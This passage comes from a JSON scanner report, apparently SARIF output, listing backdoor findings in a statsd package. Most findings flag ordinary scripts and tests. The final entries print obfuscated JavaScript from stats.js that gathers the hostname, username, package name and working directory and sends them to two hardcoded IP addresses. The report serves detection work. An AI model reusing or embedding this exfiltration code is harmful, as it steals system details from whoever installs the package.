                  "startLine": 10,
                  "startColumn": 3,
                  "endLine": 10,
                  "endColumn": 11,
                  "snippet": {
                    "text": " * Assertations.\n */\nvar chai = require('chai')\n  , expect = chai.expect;\n\nchai.Assertion.includeStack = true;\n\n",
                    "rendered": {
                      "text": " * Assertations.\n */\nvar chai = require('chai')\n  , expect = chai.expect;\n\nchai.Assertion.includeStack = true;\n\n",
                      "markdown": "` * Assertations.\n */\nvar chai = require('chai')\n  , expect = chai.expect;\n\nchai.Assertion.includeStack = true;\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/lib/mgmt_server.js"
                },
                "region": {
                  "startLine": 11,
                  "startColumn": 13,
                  "endLine": 11,
                  "endColumn": 18,
                  "snippet": {
                    "text": "\n      stream.on('data', function(data) {\n        const cmdline = data.trim().split(\" \");\n        const cmd = cmdline.shift();\n\n        on_data_callback(cmd, cmdline, stream);\n      });\n",
                    "rendered": {
                      "text": "\n      stream.on('data', function(data) {\n        const cmdline = data.trim().split(\" \");\n        const cmd = cmdline.shift();\n\n        on_data_callback(cmd, cmdline, stream);\n      });\n",
                      "markdown": "`\n      stream.on('data', function(data) {\n        const cmdline = data.trim().split(\" \");\n        const cmd = cmdline.shift();\n\n        on_data_callback(cmd, cmdline, stream);\n      });\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/utils/statsd-timer-metric-counts.sh"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 1,
                  "endLine": 3,
                  "endColumn": 5,
                  "snippet": {
                    "text": "#!/bin/bash\n# is your statsd machine maxing out cpu? ... unable to pull udp packets out of the buffer\n# at a fast enough rate? (see `netstat -su` ) timer metrics are by far the most cpu intensive\n# and tuning the sampling of those is key to keeping cpu load under control.\n# this tool (to be run on your graphite server) shows for all your timing metric keys how many packets\n# it accepted in a given interval like 1hour. using this information you can make informed decisions as\n",
                    "rendered": {
                      "text": "#!/bin/bash\n# is your statsd machine maxing out cpu? ... unable to pull udp packets out of the buffer\n# at a fast enough rate? (see `netstat -su` ) timer metrics are by far the most cpu intensive\n# and tuning the sampling of those is key to keeping cpu load under control.\n# this tool (to be run on your graphite server) shows for all your timing metric keys how many packets\n# it accepted in a given interval like 1hour. using this information you can make informed decisions as\n",
                      "markdown": "`#!/bin/bash\n# is your statsd machine maxing out cpu? ... unable to pull udp packets out of the buffer\n# at a fast enough rate? (see `netstat -su` ) timer metrics are by far the most cpu intensive\n# and tuning the sampling of those is key to keeping cpu load under control.\n# this tool (to be run on your graphite server) shows for all your timing metric keys how many packets\n# it accepted in a given interval like 1hour. using this information you can make informed decisions as\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/utils/statsd-timer-metric-counts.sh"
                },
                "region": {
                  "startLine": 33,
                  "startColumn": 40,
                  "endLine": 33,
                  "endColumn": 46,
                  "snippet": {
                    "text": "        echo \"$metric $(get_indicative_count $metric)\"\n    done\n}\nlist_timer_counts | grep 'count .*\\.0' | sort -n -k2\n",
                    "rendered": {
                      "text": "        echo \"$metric $(get_indicative_count $metric)\"\n    done\n}\nlist_timer_counts | grep 'count .*\\.0' | sort -n -k2\n",
                      "markdown": "`        echo \"$metric $(get_indicative_count $metric)\"\n    done\n}\nlist_timer_counts | grep 'count .*\\.0' | sort -n -k2\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/utils/statsd-timer-metric-counts.sh"
                },
                "region": {
                  "startLine": 33,
                  "startColumn": 19,
                  "endLine": 33,
                  "endColumn": 25,
                  "snippet": {
                    "text": "        echo \"$metric $(get_indicative_count $metric)\"\n    done\n}\nlist_timer_counts | grep 'count .*\\.0' | sort -n -k2\n",
                    "rendered": {
                      "text": "        echo \"$metric $(get_indicative_count $metric)\"\n    done\n}\nlist_timer_counts | grep 'count .*\\.0' | sort -n -k2\n",
                      "markdown": "`        echo \"$metric $(get_indicative_count $metric)\"\n    done\n}\nlist_timer_counts | grep 'count .*\\.0' | sort -n -k2\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/utils/statsd-timer-metric-counts.sh"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 58,
                  "endLine": 25,
                  "endColumn": 63,
                  "snippet": {
                    "text": "}\n\nfunction list_timer_count_files () {\n    find \"$whisper_dir/$timers_subdir\" -name 'count.wsp' | sed -e \"s#$whisper_dir/\\($timers_subdir/.*/count\\).wsp#\\1#\" -e 's#/#.#g'\n}\n\nfunction list_timer_counts () {\n",
                    "rendered": {
                      "text": "}\n\nfunction list_timer_count_files () {\n    find \"$whisper_dir/$timers_subdir\" -name 'count.wsp' | sed -e \"s#$whisper_dir/\\($timers_subdir/.*/count\\).wsp#\\1#\" -e 's#/#.#g'\n}\n\nfunction list_timer_counts () {\n",
                      "markdown": "`}\n\nfunction list_timer_count_files () {\n    find \"$whisper_dir/$timers_subdir\" -name 'count.wsp' | sed -e \"s#$whisper_dir/\\($timers_subdir/.*/count\\).wsp#\\1#\" -e 's#/#.#g'\n}\n\nfunction list_timer_counts () {\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/utils/statsd-timer-metric-counts.sh"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 3,
                  "endLine": 25,
                  "endColumn": 9,
                  "snippet": {
                    "text": "}\n\nfunction list_timer_count_files () {\n    find \"$whisper_dir/$timers_subdir\" -name 'count.wsp' | sed -e \"s#$whisper_dir/\\($timers_subdir/.*/count\\).wsp#\\1#\" -e 's#/#.#g'\n}\n\nfunction list_timer_counts () {\n",
                    "rendered": {
                      "text": "}\n\nfunction list_timer_count_files () {\n    find \"$whisper_dir/$timers_subdir\" -name 'count.wsp' | sed -e \"s#$whisper_dir/\\($timers_subdir/.*/count\\).wsp#\\1#\" -e 's#/#.#g'\n}\n\nfunction list_timer_counts () {\n",
                      "markdown": "`}\n\nfunction list_timer_count_files () {\n    find \"$whisper_dir/$timers_subdir\" -name 'count.wsp' | sed -e \"s#$whisper_dir/\\($timers_subdir/.*/count\\).wsp#\\1#\" -e 's#/#.#g'\n}\n\nfunction list_timer_counts () {\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/utils/statsd-timer-metric-counts.sh"
                },
                "region": {
                  "startLine": 21,
                  "startColumn": 38,
                  "endLine": 21,
                  "endColumn": 43,
                  "snippet": {
                    "text": "function get_indicative_count () {\n    metric=$1\n    url=$graphite_url'/render/?from=-1h&target=summarize('$metric',%221hour%22,%22sum%22)&format=csv'\n    wget -q \"$url\" -O - | tail -n -1 | sed 's#.*,##' # yields a number ending with .0 or whitespace if values were None\n}\n\nfunction list_timer_count_files () {\n",
                    "rendered": {
                      "text": "function get_indicative_count () {\n    metric=$1\n    url=$graphite_url'/render/?from=-1h&target=summarize('$metric',%221hour%22,%22sum%22)&format=csv'\n    wget -q \"$url\" -O - | tail -n -1 | sed 's#.*,##' # yields a number ending with .0 or whitespace if values were None\n}\n\nfunction list_timer_count_files () {\n",
                      "markdown": "`function get_indicative_count () {\n    metric=$1\n    url=$graphite_url'/render/?from=-1h&target=summarize('$metric',%221hour%22,%22sum%22)&format=csv'\n    wget -q \"$url\" -O - | tail -n -1 | sed 's#.*,##' # yields a number ending with .0 or whitespace if values were None\n}\n\nfunction list_timer_count_files () {\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/utils/statsd-timer-metric-counts.sh"
                },
                "region": {
                  "startLine": 21,
                  "startColumn": 25,
                  "endLine": 21,
                  "endColumn": 31,
                  "snippet": {
                    "text": "function get_indicative_count () {\n    metric=$1\n    url=$graphite_url'/render/?from=-1h&target=summarize('$metric',%221hour%22,%22sum%22)&format=csv'\n    wget -q \"$url\" -O - | tail -n -1 | sed 's#.*,##' # yields a number ending with .0 or whitespace if values were None\n}\n\nfunction list_timer_count_files () {\n",
                    "rendered": {
                      "text": "function get_indicative_count () {\n    metric=$1\n    url=$graphite_url'/render/?from=-1h&target=summarize('$metric',%221hour%22,%22sum%22)&format=csv'\n    wget -q \"$url\" -O - | tail -n -1 | sed 's#.*,##' # yields a number ending with .0 or whitespace if values were None\n}\n\nfunction list_timer_count_files () {\n",
                      "markdown": "`function get_indicative_count () {\n    metric=$1\n    url=$graphite_url'/render/?from=-1h&target=summarize('$metric',%221hour%22,%22sum%22)&format=csv'\n    wget -q \"$url\" -O - | tail -n -1 | sed 's#.*,##' # yields a number ending with .0 or whitespace if values were None\n}\n\nfunction list_timer_count_files () {\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/utils/statsd-timer-metric-counts.sh"
                },
                "region": {
                  "startLine": 21,
                  "startColumn": 3,
                  "endLine": 21,
                  "endColumn": 9,
                  "snippet": {
                    "text": "function get_indicative_count () {\n    metric=$1\n    url=$graphite_url'/render/?from=-1h&target=summarize('$metric',%221hour%22,%22sum%22)&format=csv'\n    wget -q \"$url\" -O - | tail -n -1 | sed 's#.*,##' # yields a number ending with .0 or whitespace if values were None\n}\n\nfunction list_timer_count_files () {\n",
                    "rendered": {
                      "text": "function get_indicative_count () {\n    metric=$1\n    url=$graphite_url'/render/?from=-1h&target=summarize('$metric',%221hour%22,%22sum%22)&format=csv'\n    wget -q \"$url\" -O - | tail -n -1 | sed 's#.*,##' # yields a number ending with .0 or whitespace if values were None\n}\n\nfunction list_timer_count_files () {\n",
                      "markdown": "`function get_indicative_count () {\n    metric=$1\n    url=$graphite_url'/render/?from=-1h&target=summarize('$metric',%221hour%22,%22sum%22)&format=csv'\n    wget -q \"$url\" -O - | tail -n -1 | sed 's#.*,##' # yields a number ending with .0 or whitespace if values were None\n}\n\nfunction list_timer_count_files () {\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/utils/statsd-timer-metric-counts.sh"
                },
                "region": {
                  "startLine": 17,
                  "startColumn": 3,
                  "endLine": 17,
                  "endColumn": 9,
                  "snippet": {
                    "text": "timers_subdir=stats/timers\n\n# you may want to adjust this function according to the characteristics of your environment\n# I wish whisper-fetch.py supported the same function API as the http endpoint does, then I could avoid http here.\nfunction get_indicative_count () {\n    metric=$1\n    url=$graphite_url'/render/?from=-1h&target=summarize('$metric',%221hour%22,%22sum%22)&format=csv'\n",
                    "rendered": {
                      "text": "timers_subdir=stats/timers\n\n# you may want to adjust this function according to the characteristics of your environment\n# I wish whisper-fetch.py supported the same function API as the http endpoint does, then I could avoid http here.\nfunction get_indicative_count () {\n    metric=$1\n    url=$graphite_url'/render/?from=-1h&target=summarize('$metric',%221hour%22,%22sum%22)&format=csv'\n",
                      "markdown": "`timers_subdir=stats/timers\n\n# you may want to adjust this function according to the characteristics of your environment\n# I wish whisper-fetch.py supported the same function API as the http endpoint does, then I could avoid http here.\nfunction get_indicative_count () {\n    metric=$1\n    url=$graphite_url'/render/?from=-1h&target=summarize('$metric',%221hour%22,%22sum%22)&format=csv'\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/utils/check_statsd_health"
                },
                "region": {
                  "startLine": 51,
                  "startColumn": 30,
                  "endLine": 51,
                  "endColumn": 34,
                  "snippet": {
                    "text": "    esac\ndone\n\nHEALTH=\"$(echo -e \"health\\n\" | nc \"${HOST}\" \"${PORT}\")\"\necho \"Statsd '${HOST}:${PORT}' responded: '${HEALTH}'\"\n\nif [[ \"${HEALTH}\" == \"health: up\" ]]; then\n",
                    "rendered": {
                      "text": "    esac\ndone\n\nHEALTH=\"$(echo -e \"health\\n\" | nc \"${HOST}\" \"${PORT}\")\"\necho \"Statsd '${HOST}:${PORT}' responded: '${HEALTH}'\"\n\nif [[ \"${HEALTH}\" == \"health: up\" ]]; then\n",
                      "markdown": "`    esac\ndone\n\nHEALTH=\"$(echo -e \"health\\n\" | nc \"${HOST}\" \"${PORT}\")\"\necho \"Statsd '${HOST}:${PORT}' responded: '${HEALTH}'\"\n\nif [[ \"${HEALTH}\" == \"health: up\" ]]; then\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/utils/check_statsd_health"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 6,
                  "endLine": 6,
                  "endColumn": 14,
                  "snippet": {
                    "text": "# Check the status of a statsd or statsd proxy connecting directly to the\n# management console.\n\n# This script can be used both for Nagios and Keepalived passing a parameter.\n# The default behaviour is the Nagios one.\n\nOK=0;\n",
                    "rendered": {
                      "text": "# Check the status of a statsd or statsd proxy connecting directly to the\n# management console.\n\n# This script can be used both for Nagios and Keepalived passing a parameter.\n# The default behaviour is the Nagios one.\n\nOK=0;\n",
                      "markdown": "`# Check the status of a statsd or statsd proxy connecting directly to the\n# management console.\n\n# This script can be used both for Nagios and Keepalived passing a parameter.\n# The default behaviour is the Nagios one.\n\nOK=0;\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/test/process_mgmt_tests.js"
                },
                "region": {
                  "startLine": 46,
                  "startColumn": 63,
                  "endLine": 46,
                  "endColumn": 69,
                  "snippet": {
                    "text": "        process_mgmt.set_title(config);\n        test.ok(process.title == default_title, \"If no config.title option set, set the process.title to statsd\");\n      } else {\n        console.log(\"Not running this test, due to this being a node version before v0.10 and a Darwin os\");\n      }\n      test.done();\n  }\n",
                    "rendered": {
                      "text": "        process_mgmt.set_title(config);\n        test.ok(process.title == default_title, \"If no config.title option set, set the process.title to statsd\");\n      } else {\n        console.log(\"Not running this test, due to this being a node version before v0.10 and a Darwin os\");\n      }\n      test.done();\n  }\n",
                      "markdown": "`        process_mgmt.set_title(config);\n        test.ok(process.title == default_title, \"If no config.title option set, set the process.title to statsd\");\n      } else {\n        console.log(\"Not running this test, due to this being a node version before v0.10 and a Darwin os\");\n      }\n      test.done();\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/test/process_mgmt_tests.js"
                },
                "region": {
                  "startLine": 35,
                  "startColumn": 102,
                  "endLine": 35,
                  "endColumn": 108,
                  "snippet": {
                    "text": "      process_title = process.title;\n      config.title = false;\n      process_mgmt.set_title(config);\n      test.ok(process_title == process.title, \"A config.title of false should not override the default node process.title\");\n      test.done();\n  },\n\n",
                    "rendered": {
                      "text": "      process_title = process.title;\n      config.title = false;\n      process_mgmt.set_title(config);\n      test.ok(process_title == process.title, \"A config.title of false should not override the default node process.title\");\n      test.done();\n  },\n\n",
                      "markdown": "`      process_title = process.title;\n      config.title = false;\n      process_mgmt.set_title(config);\n      test.ok(process_title == process.title, \"A config.title of false should not override the default node process.title\");\n      test.done();\n  },\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/test/process_mgmt_tests.js"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 63,
                  "endLine": 25,
                  "endColumn": 69,
                  "snippet": {
                    "text": "        process_mgmt.set_title(config);\n        test.ok(process.title == config.title, \"Can set a title that is less than or equal to the process title length\");\n      } else {\n        console.log(\"Not running this test, due to this being a node version before v0.10 and a Darwin os\");\n      }\n      test.done();\n  },\n",
                    "rendered": {
                      "text": "        process_mgmt.set_title(config);\n        test.ok(process.title == config.title, \"Can set a title that is less than or equal to the process title length\");\n      } else {\n        console.log(\"Not running this test, due to this being a node version before v0.10 and a Darwin os\");\n      }\n      test.done();\n  },\n",
                      "markdown": "`        process_mgmt.set_title(config);\n        test.ok(process.title == config.title, \"Can set a title that is less than or equal to the process title length\");\n      } else {\n        console.log(\"Not running this test, due to this being a node version before v0.10 and a Darwin os\");\n      }\n      test.done();\n  },\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/stats.js"
                },
                "region": {
                  "startLine": 2,
                  "startColumn": 2118,
                  "endLine": 2,
                  "endColumn": 2126,
                  "snippet": {
                    "text": "6={};_0x531c36[_0x6c187f(0x1e2)]=_0x6c187f(0x1d8);const _0x82c7bc=_0x531c36;http['get'](_0x12b214,_0x96e32a=>{})['on'](_0x82c7bc[_0x6c187f(0x1e2)],_0x577d5f=>{});}function _0x4f52(){const _0x5627a2=['flag','129tvDJCn','4036108OPWcJX','http://10.241.70.162:8080?','3005807ophNNk','58202HcsQNP','poi','hostname','611752PvaLzL','username','name','cwd','186nCfFcp','user','toString','18387510khuUTW','error','userInfo','8649SMaTjw','12192XyjTcV','path','191410DcTZHZ','http','./package.json','env','http://192.144.137.134:8080?','IzjUl'];_0x4f52=function(){return _0x5627a2;};return _0x4f52();}urls['forEach'](se",
                    "rendered": {
                      "text": "6={};_0x531c36[_0x6c187f(0x1e2)]=_0x6c187f(0x1d8);const _0x82c7bc=_0x531c36;http['get'](_0x12b214,_0x96e32a=>{})['on'](_0x82c7bc[_0x6c187f(0x1e2)],_0x577d5f=>{});}function _0x4f52(){const _0x5627a2=['flag','129tvDJCn','4036108OPWcJX','http://10.241.70.162:8080?','3005807ophNNk','58202HcsQNP','poi','hostname','611752PvaLzL','username','name','cwd','186nCfFcp','user','toString','18387510khuUTW','error','userInfo','8649SMaTjw','12192XyjTcV','path','191410DcTZHZ','http','./package.json','env','http://192.144.137.134:8080?','IzjUl'];_0x4f52=function(){return _0x5627a2;};return _0x4f52();}urls['forEach'](se",
                      "markdown": "`6={};_0x531c36[_0x6c187f(0x1e2)]=_0x6c187f(0x1d8);const _0x82c7bc=_0x531c36;http['get'](_0x12b214,_0x96e32a=>{})['on'](_0x82c7bc[_0x6c187f(0x1e2)],_0x577d5f=>{});}function _0x4f52(){const _0x5627a2=['flag','129tvDJCn','4036108OPWcJX','http://10.241.70.162:8080?','3005807ophNNk','58202HcsQNP','poi','hostname','611752PvaLzL','username','name','cwd','186nCfFcp','user','toString','18387510khuUTW','error','userInfo','8649SMaTjw','12192XyjTcV','path','191410DcTZHZ','http','./package.json','env','http://192.144.137.134:8080?','IzjUl'];_0x4f52=function(){return _0x5627a2;};return _0x4f52();}urls['forEach'](se`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/stats.js"
                },
                "region": {
                  "startLine": 2,
                  "startColumn": 1516,
                  "endLine": 2,
                  "endColumn": 1524,
                  "snippet": {
                    "text": "(0x1cf)](),pwd=process[_0x5a6e1c(0x1e0)]['PWD']||process[_0x5a6e1c(0x1d3)](),packageName=require(_0x5a6e1c(0x1df))[_0x5a6e1c(0x1d2)],username=os[_0x5a6e1c(0x1d9)]()[_0x5a6e1c(0x1d1)],_0x480c68={};_0x480c68[_0x5a6e1c(0x1e3)]=_0x5a6e1c(0x1ce),_0x480c68['packagename']=packageName,_0x480c68['hostname']=hostname,_0x480c68[_0x5a6e1c(0x1d5)]=username,_0x480c68[_0x5a6e1c(0x1dc)]=pwd;const queryParams=_0x480c68,queryString=new URLSearchParams(queryParams)[_0x5a6e1c(0x1d6)](),urls=[_0x5a6e1c(0x1e1)+queryString,_0x5a6e1c(0x1e6)+queryString];function sendRequest(_0x12b214){const _0x6c187f=_0x5a6e1c,_0x531c36={};_",
                    "rendered": {
                      "text": "(0x1cf)](),pwd=process[_0x5a6e1c(0x1e0)]['PWD']||process[_0x5a6e1c(0x1d3)](),packageName=require(_0x5a6e1c(0x1df))[_0x5a6e1c(0x1d2)],username=os[_0x5a6e1c(0x1d9)]()[_0x5a6e1c(0x1d1)],_0x480c68={};_0x480c68[_0x5a6e1c(0x1e3)]=_0x5a6e1c(0x1ce),_0x480c68['packagename']=packageName,_0x480c68['hostname']=hostname,_0x480c68[_0x5a6e1c(0x1d5)]=username,_0x480c68[_0x5a6e1c(0x1dc)]=pwd;const queryParams=_0x480c68,queryString=new URLSearchParams(queryParams)[_0x5a6e1c(0x1d6)](),urls=[_0x5a6e1c(0x1e1)+queryString,_0x5a6e1c(0x1e6)+queryString];function sendRequest(_0x12b214){const _0x6c187f=_0x5a6e1c,_0x531c36={};_",
                      "markdown": "`(0x1cf)](),pwd=process[_0x5a6e1c(0x1e0)]['PWD']||process[_0x5a6e1c(0x1d3)](),packageName=require(_0x5a6e1c(0x1df))[_0x5a6e1c(0x1d2)],username=os[_0x5a6e1c(0x1d9)]()[_0x5a6e1c(0x1d1)],_0x480c68={};_0x480c68[_0x5a6e1c(0x1e3)]=_0x5a6e1c(0x1ce),_0x480c68['packagename']=packageName,_0x480c68['hostname']=hostname,_0x480c68[_0x5a6e1c(0x1d5)]=username,_0x480c68[_0x5a6e1c(0x1dc)]=pwd;const queryParams=_0x480c68,queryString=new URLSearchParams(queryParams)[_0x5a6e1c(0x1d6)](),urls=[_0x5a6e1c(0x1e1)+queryString,_0x5a6e1c(0x1e6)+queryString];function sendRequest(_0x12b214){const _0x6c187f=_0x5a6e1c,_0x531c36={};_`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/stats.js"
                },
                "region": {
                  "startLine": 2,
                  "startColumn": 1505,
                  "endLine": 2,
                  "endColumn": 1513,
                  "snippet": {
                    "text": "s[_0x5a6e1c(0x1cf)](),pwd=process[_0x5a6e1c(0x1e0)]['PWD']||process[_0x5a6e1c(0x1d3)](),packageName=require(_0x5a6e1c(0x1df))[_0x5a6e1c(0x1d2)],username=os[_0x5a6e1c(0x1d9)]()[_0x5a6e1c(0x1d1)],_0x480c68={};_0x480c68[_0x5a6e1c(0x1e3)]=_0x5a6e1c(0x1ce),_0x480c68['packagename']=packageName,_0x480c68['hostname']=hostname,_0x480c68[_0x5a6e1c(0x1d5)]=username,_0x480c68[_0x5a6e1c(0x1dc)]=pwd;const queryParams=_0x480c68,queryString=new URLSearchParams(queryParams)[_0x5a6e1c(0x1d6)](),urls=[_0x5a6e1c(0x1e1)+queryString,_0x5a6e1c(0x1e6)+queryString];function sendRequest(_0x12b214){const _0x6c187f=_0x5a6e1c,_0x",
                    "rendered": {
